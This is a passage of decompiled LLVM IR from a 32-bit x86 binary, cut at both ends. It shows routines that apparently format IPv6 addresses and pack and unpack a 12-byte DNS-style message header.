  %stack_var_-120.153 = phi i8* [ null, %dec_label_pc_8051ef5 ], [ %stack_var_-120.0, %dec_label_pc_8051f8b ]
  %stack_var_-116.152 = phi i32 [ 32, %dec_label_pc_8051ef5 ], [ %stack_var_-116.0, %dec_label_pc_8051f8b ]
  br i1 %v10_8051f9557, label %dec_label_pc_8051f1a, label %dec_label_pc_8051f05

dec_label_pc_8051f05:                             ; preds = %dec_label_pc_8051f00
  %v2_8051f05 = sub i32 %v0_8051f1a56, %v1_8051f1055
  %v8_8051f05 = xor i32 %v0_8051f1a56, %v1_8051f1055
  %v9_8051f05 = xor i32 %v2_8051f05, %v0_8051f1a56
  %v10_8051f05 = and i32 %v9_8051f05, %v8_8051f05
  %v11_8051f05 = icmp slt i32 %v10_8051f05, 0
  %v12_8051f05 = icmp eq i32 %v2_8051f05, 0
  %v13_8051f05 = icmp slt i32 %v2_8051f05, 0
  %v2_8051f07 = icmp eq i1 %v13_8051f05, %v11_8051f05
  br i1 %v2_8051f07, label %dec_label_pc_8051f09, label %dec_label_pc_8051f1a

dec_label_pc_8051f09:                             ; preds = %dec_label_pc_8051f05
  %v1_8051f09 = load i32, i32* @ebp, align 4
  %v2_8051f09 = add i32 %v1_8051f09, %v1_8051f1055
  store i32 %v2_8051f09, i32* %eax.global-to-local, align 4
  %v2_8051f0c = sub i32 %v0_8051f1a56, %v2_8051f09
  %v8_8051f0c = xor i32 %v2_8051f09, %v0_8051f1a56
  %v9_8051f0c = xor i32 %v2_8051f0c, %v0_8051f1a56
  %v10_8051f0c = and i32 %v9_8051f0c, %v8_8051f0c
  %v11_8051f0c = icmp slt i32 %v10_8051f0c, 0
  %v13_8051f0c = icmp slt i32 %v2_8051f0c, 0
  %v2_8051f0e = icmp eq i1 %v13_8051f0c, %v11_8051f0c
  br i1 %v2_8051f0e, label %dec_label_pc_8051f1a, label %dec_label_pc_8051f10

dec_label_pc_8051f10:                             ; preds = %dec_label_pc_8051f09
  %v1_8051f12 = icmp eq i1 %v12_8051f05, false
  br i1 %v1_8051f12, label %dec_label_pc_8051f8b, label %dec_label_pc_8051f14

dec_label_pc_8051f14:                             ; preds = %dec_label_pc_8051f10
  %v1_8051f14 = inttoptr i32 %v0_8051f1e54 to i8*
  store i8 58, i8* %v1_8051f14, align 1
  %v0_8051f17 = load i32, i32* @ebx, align 4
  %v1_8051f17 = add i32 %v0_8051f17, 1
  store i32 %v1_8051f17, i32* @ebx, align 4
  br label %dec_label_pc_8051f8b

dec_label_pc_8051f1a:                             ; preds = %dec_label_pc_8051f05, %dec_label_pc_8051f09, %dec_label_pc_8051f00
  %v1_8051f1a = icmp eq i32 %v0_8051f1a56, 0
  br i1 %v1_8051f1a, label %dec_label_pc_8051f22, label %dec_label_pc_8051f1e

dec_label_pc_8051f1e:                             ; preds = %dec_label_pc_8051f1a
  %v1_8051f1e = inttoptr i32 %v0_8051f1e54 to i8*
  store i8 58, i8* %v1_8051f1e, align 1
  %v0_8051f21 = load i32, i32* @ebx, align 4
  %v1_8051f21 = add i32 %v0_8051f21, 1
  store i32 %v1_8051f21, i32* @ebx, align 4
  %v0_8051f22.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f22

dec_label_pc_8051f22:                             ; preds = %dec_label_pc_8051f1a, %dec_label_pc_8051f1e
  %v0_8051f80 = phi i32 [ %v0_8051f1e54, %dec_label_pc_8051f1a ], [ %v1_8051f21, %dec_label_pc_8051f1e ]
  %v1_8051f77 = phi i32 [ 0, %dec_label_pc_8051f1a ], [ %v0_8051f22.pre, %dec_label_pc_8051f1e ]
  %v9_8051f22 = icmp eq i32 %v1_8051f77, 6
  %v1_8051f25 = icmp eq i1 %v9_8051f22, false
  br i1 %v1_8051f25, label %dec_label_pc_8051f76, label %dec_label_pc_8051f27

dec_label_pc_8051f27:                             ; preds = %dec_label_pc_8051f22
  %v0_8051f27 = load i32, i32* @edi, align 4
  %v1_8051f27 = icmp eq i32 %v0_8051f27, 0
  %v1_8051f29 = icmp eq i1 %v1_8051f27, false
  br i1 %v1_8051f29, label %dec_label_pc_8051f76, label %dec_label_pc_8051f2b

dec_label_pc_8051f2b:                             ; preds = %dec_label_pc_8051f27
  %v0_8051f2b = load i32, i32* @ebp, align 4
  %v9_8051f2b = icmp eq i32 %v0_8051f2b, 6
  br i1 %v9_8051f2b, label %dec_label_pc_8051f3f, label %dec_label_pc_8051f30

dec_label_pc_8051f30:                             ; preds = %dec_label_pc_8051f2b
  %v9_8051f30 = icmp eq i32 %v0_8051f2b, 5
  %v1_8051f33 = icmp eq i1 %v9_8051f30, false
  br i1 %v1_8051f33, label %dec_label_pc_8051f76, label %dec_label_pc_8051f35

dec_label_pc_8051f35:                             ; preds = %dec_label_pc_8051f30
  br i1 %v1_8051f3d, label %dec_label_pc_8051f76, label %dec_label_pc_8051f3f

dec_label_pc_8051f3f:                             ; preds = %dec_label_pc_8051f35, %dec_label_pc_8051f2b
  %v2_8051f45 = sub i32 %v0_8051f80, %v2_8051ef5
  store i32 %v2_8051f45, i32* @esi, align 4
  %v2_8051f50 = sub i32 46, %v2_8051f45
  store i32 %v2_8051f50, i32* @ecx, align 4
  store i32 %v0_8051f80, i32* @edx, align 4
  %v1_8051f54 = add i32 %arg2, 12
  store i32 %v1_8051f54, i32* @eax, align 4
  %v0_8051f57 = load i32, i32* %stack_var_-124, align 4
  %v2_8051f57 = ptrtoint i8* %stack_var_-120.153 to i32
  %v4_8051f57 = call i32 @function_8051d10(i32 %v0_8051f57, i32 %v2_8051f57, i32 %stack_var_-116.152)
  store i32 %v4_8051f57, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8051f5e = icmp eq i32 %v4_8051f57, 0
  br i1 %v1_8051f5e, label %dec_label_pc_8051fe8, label %dec_label_pc_8051f66

dec_label_pc_8051f66:                             ; preds = %dec_label_pc_8051f3f
  %v0_8051f69 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f69, i32* %stack_var_-124, align 4
  %v1_8051f6a = inttoptr i32 %v0_8051f69 to i8*
  %v2_8051f6a = call i32 @function_804d514(i8* %v1_8051f6a)
  store i32 %v2_8051f6a, i32* %eax.global-to-local, align 4
  %v0_8051f72 = load i32, i32* @ebx, align 4
  %v3_8051f72 = add i32 %v0_8051f72, %v2_8051f6a
  store i32 %v3_8051f72, i32* @ebx, align 4
  %v0_8051f9a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051f9a

dec_label_pc_8051f76:                             ; preds = %dec_label_pc_8051f35, %dec_label_pc_8051f30, %dec_label_pc_8051f27, %dec_label_pc_8051f22
  %v0_8051f76 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051f76, i32* %stack_var_-112, align 4
  %v2_8051f77 = mul i32 %v1_8051f77, 4
  %v4_8051f77 = add i32 %v3_8051f77, %v2_8051f77
  %v5_8051f77 = inttoptr i32 %v4_8051f77 to i32*
  %v6_8051f77 = load i32, i32* %v5_8051f77, align 4
  store i32 %v0_8051f80, i32* %stack_var_-124, align 4
  %v4_8051f81 = call i32 @function_804bbf0(i32 %v0_8051f80, i32 ptrtoint ([3 x i8]* @global_var_8055071.210 to i32), i32 %v6_8051f77)
  store i32 %v4_8051f81, i32* %eax.global-to-local, align 4
  %v0_8051f89 = load i32, i32* @ebx, align 4
  %v2_8051f89 = add i32 %v0_8051f89, %v4_8051f81
  store i32 %v2_8051f89, i32* @ebx, align 4
  br label %dec_label_pc_8051f8b

dec_label_pc_8051f8b:                             ; preds = %dec_label_pc_8051f10, %dec_label_pc_8051f14, %dec_label_pc_8051f76
  %stack_var_-116.0 = phi i32 [ %v6_8051f77, %dec_label_pc_8051f76 ], [ %stack_var_-116.152, %dec_label_pc_8051f10 ], [ %stack_var_-116.152, %dec_label_pc_8051f14 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8055071.210, i32 0, i32 0), %dec_label_pc_8051f76 ], [ %stack_var_-120.153, %dec_label_pc_8051f10 ], [ %stack_var_-120.153, %dec_label_pc_8051f14 ]
  %v0_8051f1418 = phi i32 [ %v2_8051f89, %dec_label_pc_8051f76 ], [ %v0_8051f1e54, %dec_label_pc_8051f10 ], [ %v1_8051f17, %dec_label_pc_8051f14 ]
  %v0_8051f8b = load i32, i32* @esi, align 4
  %v1_8051f8b = add i32 %v0_8051f8b, 1
  %v0_8051f95.pre = load i32, i32* @edi, align 4
  store i32 %v1_8051f8b, i32* @esi, align 4
  %v7_8051f8f = icmp sgt i32 %v1_8051f8b, 7
  %v10_8051f95 = icmp eq i32 %v0_8051f95.pre, -1
  br i1 %v7_8051f8f, label %dec_label_pc_8051f95, label %dec_label_pc_8051f00

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051f8b
  br i1 %v10_8051f95, label %dec_label_pc_8051fa6, label %dec_label_pc_8051f9a

dec_label_pc_8051f9a:                             ; preds = %dec_label_pc_8051f95, %dec_label_pc_8051f66
  %v0_8051fa2 = phi i32 [ %v0_8051f1418, %dec_label_pc_8051f95 ], [ %v3_8051f72, %dec_label_pc_8051f66 ]
  %v0_8051f9a = phi i32 [ %v0_8051f95.pre, %dec_label_pc_8051f95 ], [ %v0_8051f9a.pre, %dec_label_pc_8051f66 ]
  %v1_8051f9a = load i32, i32* @ebp, align 4
  %v2_8051f9a = add i32 %v1_8051f9a, %v0_8051f9a
  store i32 %v2_8051f9a, i32* %eax.global-to-local, align 4
  %v9_8051f9d = icmp eq i32 %v2_8051f9a, 8
  %v1_8051fa0 = icmp eq i1 %v9_8051f9d, false
  br i1 %v1_8051fa0, label %dec_label_pc_8051fa6, label %dec_label_pc_8051fa2

dec_label_pc_8051fa2:                             ; preds = %dec_label_pc_8051f9a
  %v1_8051fa2 = inttoptr i32 %v0_8051fa2 to i8*
  store i8 58, i8* %v1_8051fa2, align 1
  %v0_8051fa5 = load i32, i32* @ebx, align 4
  %v1_8051fa5 = add i32 %v0_8051fa5, 1
  store i32 %v1_8051fa5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fa6

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051f9a, %dec_label_pc_8051f95, %dec_label_pc_8051fa2
  %v0_8051faa = phi i32 [ %v0_8051fa2, %dec_label_pc_8051f9a ], [ %v0_8051f1418, %dec_label_pc_8051f95 ], [ %v1_8051fa5, %dec_label_pc_8051fa2 ]
  store i32 %v2_8051ef5, i32* %edx.global-to-local, align 4
  %v1_8051faa = add i32 %v0_8051faa, 1
  store i32 %v1_8051faa, i32* %eax.global-to-local, align 4
  %v1_8051fad = inttoptr i32 %v0_8051faa to i8*
  store i8 0, i8* %v1_8051fad, align 1
  %v0_8051fb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051fb0 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051fb0 = sub i32 %v0_8051fb0, %v1_8051fb0
  store i32 %v2_8051fb0, i32* @eax, align 4
  %tmp67 = icmp ugt i32 %v2_8051fb0, %arg4
  br i1 %tmp67, label %dec_label_pc_8051fb8, label %dec_label_pc_8051fc5

dec_label_pc_8051fb8:                             ; preds = %dec_label_pc_8051fa6
  %v0_8051fb8 = load i32, i32* %stack_var_-124, align 4
  %v1_8051fb8 = call i32 @function_804baa4(i32 %v0_8051fb8)
  store i32 %v1_8051fb8, i32* %eax.global-to-local, align 4
  %v1_8051fbd = inttoptr i32 %v1_8051fb8 to i32*
  store i32 28, i32* %v1_8051fbd, align 4
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fc5:                             ; preds = %dec_label_pc_8051fa6
  %v0_8051fc5 = load i32, i32* @edi, align 4
  store i32 %v0_8051fc5, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_8051fcf = inttoptr i32 %arg3 to i8*
  %v4_8051fcf = call i32 @function_804d4f8(i8* %v3_8051fcf, i32 %v2_8051ef5)
  store i32 %v4_8051fcf, i32* %eax.global-to-local, align 4
  store i32 %v4_8051fcf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051fe8

dec_label_pc_8051fdb:                             ; preds = %dec_label_pc_8051e31
  %v1_8051fdb = call i32 @function_804baa4(i32 %v0_8051e24)
  store i32 %v1_8051fdb, i32* %eax.global-to-local, align 4
  %v1_8051fe0 = inttoptr i32 %v1_8051fdb to i32*
  store i32 97, i32* %v1_8051fe0, align 4
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fe6:                             ; preds = %dec_label_pc_8051fb8, %dec_label_pc_8051fdb
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051fe8

dec_label_pc_8051fe8:                             ; preds = %dec_label_pc_8051f3f, %dec_label_pc_8051fc5, %dec_label_pc_8051e3c, %dec_label_pc_8051fe6
  %v0_8051feb = phi i32 [ 0, %dec_label_pc_8051f3f ], [ %v4_8051fcf, %dec_label_pc_8051fc5 ], [ %v3_8051e48, %dec_label_pc_8051e3c ], [ 0, %dec_label_pc_8051fe6 ]
  store i32 %v0_8051feb, i32* %eax.global-to-local, align 4
  store i32 %v0_8051e24, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051feb

; uselistorder directives
  uselistorder i32 %v0_8051feb, { 1, 0 }
  uselistorder i32 %v0_8051faa, { 1, 0 }
  uselistorder i1 %v10_8051f95, { 1, 0 }
  uselistorder i32 %v0_8051f95.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051f8b, { 1, 0, 2 }
  uselistorder i32 %v1_8051f77, { 1, 0 }
  uselistorder i32 %v0_8051f80, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8051f0c, { 1, 0 }
  uselistorder i32 %v2_8051f05, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.152, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.153, { 2, 1, 0 }
  uselistorder i32 %v0_8051f1e54, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8051f1055, { 2, 1, 0 }
  uselistorder i32 %v0_8051f1a56, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8051ef5, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8051f9517, { 1, 0 }
  uselistorder i32 %v1_8051eea, { 1, 0 }
  uselistorder i32 %v0_8051eea, { 1, 0, 2 }
  uselistorder i32 %v5_8051ef2, { 1, 2, 0 }
  uselistorder i32 %v1_8051ecd, { 0, 2, 1 }
  uselistorder i32 %v0_8051ebd8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8051ec812, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8051eb8, { 1, 0 }
  uselistorder i32 %v0_8051ee358, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051ed859, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051ecd61, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8051e8562, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8051e24, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_804d4f8, { 0, 3, 1, 2, 4, 5 }
  uselistorder [3 x i8]* @global_var_8055071.210, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 64, { 6, 2, 8, 3, 5, 7, 1, 4, 0 }
  uselistorder i32* @esp, { 0, 1, 25, 6, 26, 27, 28, 29, 30, 31, 7, 32, 33, 34, 35, 36, 37, 38, 9, 39, 40, 41, 42, 43, 15, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 11, 54, 55, 56, 12, 57, 8, 58, 59, 60, 61, 62, 63, 13, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 10, 77, 78, 79, 80, 81, 82, 14, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 16, 106, 2, 3, 149, 4, 5, 17, 107, 108, 109, 110, 18, 111, 112, 113, 114, 21, 115, 116, 117, 22, 118, 23, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 20, 132, 24, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 19, 145, 146, 147, 148, 104 }
  uselistorder i32 15, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 7, 8, 9, 10, 0, 11, 6, 2, 1, 3, 4, 5 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_804d4e0, { 6, 3, 4, 5, 8, 12, 10, 11, 9, 0, 1, 2, 7 }
  uselistorder i32 (i32, i32, i32)* @function_8051d10, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051fe8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fe6, { 1, 0 }
  uselistorder label %dec_label_pc_8051fa6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051f8b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051f22, { 1, 0 }
  uselistorder label %dec_label_pc_8051f1a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f00, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef5, { 1, 0 }
  uselistorder label %dec_label_pc_8051ee5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ecd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051eca, { 1, 0 }
  uselistorder label %dec_label_pc_8051ea0, { 1, 0 }
}

define i32 @function_8051ff4() local_unnamed_addr {
dec_label_pc_8051ff4:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ff8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ff8, i32* %stack_var_-8, align 4
  store i32 %tmp5, i32* %ebx.global-to-local, align 4
  %v4_8052002 = ptrtoint i8* %tmp to i32
  store i32 %v4_8052002, i32* %esi.global-to-local, align 4
  %v7_8052006 = icmp sgt i32 %tmp6, 11
  br i1 %v7_8052006, label %dec_label_pc_805200c, label %dec_label_pc_80520a0

dec_label_pc_805200c:                             ; preds = %dec_label_pc_8051ff4
  %v1_805200c = add i32 %tmp5, 1
  %v2_805200c = inttoptr i32 %v1_805200c to i8*
  %v3_805200c = load i8, i8* %v2_805200c, align 1
  store i8 %v3_805200c, i8* %tmp, align 1
  %v0_8052012 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052012 = inttoptr i32 %v0_8052012 to i32*
  %v2_8052012 = load i32, i32* %v1_8052012, align 4
  %v1_8052014 = trunc i32 %v2_8052012 to i8
  %v2_8052014 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052014 = add i32 %v2_8052014, 1
  %v4_8052014 = inttoptr i32 %v3_8052014 to i8*
  store i8 %v1_8052014, i8* %v4_8052014, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8052039 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052039 = add i32 %v0_8052039, 8
  %v2_8052039 = inttoptr i32 %v1_8052039 to i32*
  %v3_8052039 = load i32, i32* %v2_8052039, align 4
  %v1_805203c = mul i32 %v3_8052039, 8
  %v2_805203f = and i32 %v1_805203c, 120
  %v2_8052042 = or i32 %v2_805203f, 4
  store i32 %v2_8052042, i32* %edx.global-to-local, align 4
  %v1_8052044 = add i32 %v0_8052039, 20
  %v2_8052044 = inttoptr i32 %v1_8052044 to i32*
  %v3_8052044 = load i32, i32* %v2_8052044, align 4
  %v4_8052044 = icmp eq i32 %v3_8052044, 0
  %v1_8052048 = icmp eq i1 %v4_8052044, false
  %v2_8052048 = zext i1 %v1_8052048 to i32
  %v2_805204b = or i32 %v2_8052048, %v2_8052042
  store i32 %v2_805204b, i32* %edx.global-to-local, align 4
  %v2_805204d = or i32 %v2_805204b, 130
  %v3_805204d = trunc i32 %v2_805204d to i8
  store i32 %v2_805204d, i32* @ecx, align 4
  %v2_805204f = load i32, i32* %esi.global-to-local, align 4
  %v3_805204f = add i32 %v2_805204f, 2
  %v4_805204f = inttoptr i32 %v3_805204f to i8*
  store i8 %v3_805204d, i8* %v4_805204f, align 1
  %v0_8052052 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052056 = add i32 %v0_8052052, 28
  %v2_8052056 = inttoptr i32 %v1_8052056 to i8*
  %v3_8052056 = load i8, i8* %v2_8052056, align 1
  %v5_8052056 = load i32, i32* %edx.global-to-local, align 4
  %v2_805205f = urem i8 %v3_8052056, 16
  %v7_805205f = zext i8 %v2_805205f to i32
  %v9_805205f = and i32 %v5_8052056, -256
  %v10_805205f = or i32 %v9_805205f, %v7_805205f
  store i32 %v10_805205f, i32* %edx.global-to-local, align 4
  %v2_8052062 = or i8 %v2_805205f, -128
  %v2_8052064 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052064 = add i32 %v2_8052064, 3
  %v4_8052064 = inttoptr i32 %v3_8052064 to i8*
  store i8 %v2_8052062, i8* %v4_8052064, align 1
  %v0_8052067 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052067 = add i32 %v0_8052067, 33
  %v2_8052067 = inttoptr i32 %v1_8052067 to i8*
  %v3_8052067 = load i8, i8* %v2_8052067, align 1
  %v2_805206b = load i32, i32* %esi.global-to-local, align 4
  %v3_805206b = add i32 %v2_805206b, 4
  %v4_805206b = inttoptr i32 %v3_805206b to i8*
  store i8 %v3_8052067, i8* %v4_805206b, align 1
  %v0_805206e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805206e = add i32 %v0_805206e, 32
  %v2_805206e = inttoptr i32 %v1_805206e to i32*
  %v3_805206e = load i32, i32* %v2_805206e, align 4
  %v1_8052071 = trunc i32 %v3_805206e to i8
  %v2_8052071 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052071 = add i32 %v2_8052071, 5
  %v4_8052071 = inttoptr i32 %v3_8052071 to i8*
  store i8 %v1_8052071, i8* %v4_8052071, align 1
  %v0_8052074 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052074 = add i32 %v0_8052074, 37
  %v2_8052074 = inttoptr i32 %v1_8052074 to i8*
  %v3_8052074 = load i8, i8* %v2_8052074, align 1
  %v2_8052078 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052078 = add i32 %v2_8052078, 6
  %v4_8052078 = inttoptr i32 %v3_8052078 to i8*
  store i8 %v3_8052074, i8* %v4_8052078, align 1
  %v0_805207b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805207b = add i32 %v0_805207b, 36
  %v2_805207b = inttoptr i32 %v1_805207b to i32*
  %v3_805207b = load i32, i32* %v2_805207b, align 4
  %v1_805207e = trunc i32 %v3_805207b to i8
  %v2_805207e = load i32, i32* %esi.global-to-local, align 4
  %v3_805207e = add i32 %v2_805207e, 7
  %v4_805207e = inttoptr i32 %v3_805207e to i8*
  store i8 %v1_805207e, i8* %v4_805207e, align 1
  %v0_8052081 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052081 = add i32 %v0_8052081, 41
  %v2_8052081 = inttoptr i32 %v1_8052081 to i8*
  %v3_8052081 = load i8, i8* %v2_8052081, align 1
  %v2_8052085 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052085 = add i32 %v2_8052085, 8
  %v4_8052085 = inttoptr i32 %v3_8052085 to i8*
  store i8 %v3_8052081, i8* %v4_8052085, align 1
  %v0_8052088 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052088 = add i32 %v0_8052088, 40
  %v2_8052088 = inttoptr i32 %v1_8052088 to i32*
  %v3_8052088 = load i32, i32* %v2_8052088, align 4
  %v1_805208b = trunc i32 %v3_8052088 to i8
  %v2_805208b = load i32, i32* %esi.global-to-local, align 4
  %v3_805208b = add i32 %v2_805208b, 9
  %v4_805208b = inttoptr i32 %v3_805208b to i8*
  store i8 %v1_805208b, i8* %v4_805208b, align 1
  %v0_805208e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805208e = add i32 %v0_805208e, 45
  %v2_805208e = inttoptr i32 %v1_805208e to i8*
  %v3_805208e = load i8, i8* %v2_805208e, align 1
  %v2_8052092 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052092 = add i32 %v2_8052092, 10
  %v4_8052092 = inttoptr i32 %v3_8052092 to i8*
  store i8 %v3_805208e, i8* %v4_8052092, align 1
  %v0_8052095 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052095 = add i32 %v0_8052095, 44
  %v2_8052095 = inttoptr i32 %v1_8052095 to i32*
  %v3_8052095 = load i32, i32* %v2_8052095, align 4
  %v1_8052098 = trunc i32 %v3_8052095 to i8
  %v2_8052098 = load i32, i32* %esi.global-to-local, align 4
  %v3_8052098 = add i32 %v2_8052098, 11
  %v4_8052098 = inttoptr i32 %v3_8052098 to i8*
  store i8 %v1_8052098, i8* %v4_8052098, align 1
  %v2_80520a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80520a0

dec_label_pc_80520a0:                             ; preds = %dec_label_pc_8051ff4, %dec_label_pc_805200c
  %v2_80520a0 = phi i32 [ %v0_8051ff8, %dec_label_pc_8051ff4 ], [ %v2_80520a0.pre, %dec_label_pc_805200c ]
  %v0_80520a2 = phi i32 [ -1, %dec_label_pc_8051ff4 ], [ 12, %dec_label_pc_805200c ]
  store i32 %v2_80520a0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80520a2

; uselistorder directives
  uselistorder i32 45, { 3, 1, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80520a0, { 1, 0 }
}

define i32 @function_80520a4() local_unnamed_addr {
dec_label_pc_80520a4:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_80520a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80520a4, i32* %stack_var_-4, align 4
  %v4_80520a5 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_80520a5, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_80520ad = load i8, i8* %tmp2, align 1
  %v3_80520ad = zext i8 %v2_80520ad to i32
  %v1_80520b0 = add i32 %v4_80520a5, 1
  %v2_80520b0 = inttoptr i32 %v1_80520b0 to i8*
  %v3_80520b0 = load i8, i8* %v2_80520b0, align 1
  %v4_80520b0 = zext i8 %v3_80520b0 to i32
  %v2_80520b4 = mul nuw nsw i32 %v3_80520ad, 256
  %v2_80520b7 = or i32 %v4_80520b0, %v2_80520b4
  %v2_80520b9 = inttoptr i32 %tmp to i32*
  store i32 %v2_80520b7, i32* %v2_80520b9, align 4
  %v0_80520bb = load i32, i32* @ecx, align 4
  %v1_80520bb = add i32 %v0_80520bb, 2
  %v2_80520bb = inttoptr i32 %v1_80520bb to i8*
  %v3_80520bb = load i8, i8* %v2_80520bb, align 1
  %tmp6 = icmp slt i8 %v3_80520bb, 0
  %v2_80520bf = zext i1 %tmp6 to i32
  %v1_80520c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520c2 = add i32 %v1_80520c2, 4
  %v3_80520c2 = inttoptr i32 %v2_80520c2 to i32*
  store i32 %v2_80520bf, i32* %v3_80520c2, align 4
  %v0_80520c5 = load i32, i32* @ecx, align 4
  %v1_80520c5 = add i32 %v0_80520c5, 2
  %v2_80520c5 = inttoptr i32 %v1_80520c5 to i8*
  %v3_80520c5 = load i8, i8* %v2_80520c5, align 1
  %v3_80520c8 = udiv i8 %v3_80520c5, 8
  %tmp7 = urem i8 %v3_80520c8, 16
  %v1_80520cb = zext i8 %tmp7 to i32
  %v1_80520ce = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520ce = add i32 %v1_80520ce, 8
  %v3_80520ce = inttoptr i32 %v2_80520ce to i32*
  store i32 %v1_80520cb, i32* %v3_80520ce, align 4
  %v0_80520d1 = load i32, i32* @ecx, align 4
  %v1_80520d1 = add i32 %v0_80520d1, 2
  %v2_80520d1 = inttoptr i32 %v1_80520d1 to i8*
  %v3_80520d1 = load i8, i8* %v2_80520d1, align 1
  %div = udiv i8 %v3_80520d1, 4
  %tmp8 = urem i8 %div, 2
  %v1_80520d8 = zext i8 %tmp8 to i32
  %v1_80520db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520db = add i32 %v1_80520db, 12
  %v3_80520db = inttoptr i32 %v2_80520db to i32*
  store i32 %v1_80520d8, i32* %v3_80520db, align 4
  %v0_80520de = load i32, i32* @ecx, align 4
  %v1_80520de = add i32 %v0_80520de, 2
  %v2_80520de = inttoptr i32 %v1_80520de to i8*
  %v3_80520de = load i8, i8* %v2_80520de, align 1
  %div5 = udiv i8 %v3_80520de, 2
